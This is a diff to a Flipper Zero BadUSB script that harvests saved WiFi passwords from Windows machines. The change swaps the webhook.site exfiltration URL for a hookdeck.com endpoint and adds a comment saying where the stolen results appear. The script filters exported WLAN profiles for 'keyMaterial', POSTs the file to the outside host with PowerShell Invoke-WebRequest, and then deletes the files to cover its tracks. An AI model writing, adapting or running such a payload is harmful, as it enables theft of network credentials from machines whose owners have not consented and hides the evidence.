@@ -1,6 +1,7 @@
 REM This is a flipperzero script to grab WiFi passwords from Windows machines.
 REM Tested on Windows 11 Professional (without UAC enabled and a user with local administrator rights).
 REM Remember to replace the URL parameter with your own unique parameter from https://webhook.site/.
+REM The result is displayed on the https://dashboard.hookdeck.com/onboarding/webhooks page.
 REM (c) 2023 Peter Feil
 REM -------------------------------------------------------
 REM Close all Windows
@@ -21,7 +22,7 @@ ENTER
 STRING powershell Select-String -Path WLAN*.xml -Pattern 'keyMaterial' > WiFi-PASS
 ENTER
 DELAY 1000
-STRING powershell Invoke-WebRequest -Uri https://webhook.site/e8b12c13-ea85-46e0-950c-c20654dee2fe -Method POST -InFile WiFi-PASS
+STRING powershell Invoke-WebRequest -Uri https://events.hookdeck.com/e/src_gRR83Xv1x1Bo -Method POST -InFile WiFi-PASS
 ENTER
 DELAY 1000
 STRING del WiFi* /s /f /q
